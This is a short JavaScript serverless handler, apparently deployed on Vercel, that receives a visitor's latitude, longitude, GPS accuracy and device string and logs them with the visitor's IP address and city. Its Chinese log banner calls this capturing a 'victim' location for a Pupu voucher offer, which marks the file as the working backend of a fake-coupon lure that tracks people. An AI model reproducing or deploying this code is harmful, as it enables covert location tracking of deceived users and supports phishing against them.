export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { latitude, longitude, accuracy, ua } = req.body;
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
      const city = decodeURIComponent(req.headers['x-vercel-ip-city'] || '未知城市');
      
      console.log("=== 【朴朴代金券】捕获到受害者/用户定位 ===");
      console.log(`IP: ${ip} | 城市: ${city}`);
      console.log(`经纬度: 纬度 ${latitude} , 经度 ${longitude} (精度: ${accuracy}米)`);
      console.log(`设备: ${ua}`);
      console.log("==========================================");

      return res.status(200).json({ success: true });
    } catch (error) {
      return res.status(500).json({ success: false });
    }
  }
  res.status(405).end();
}
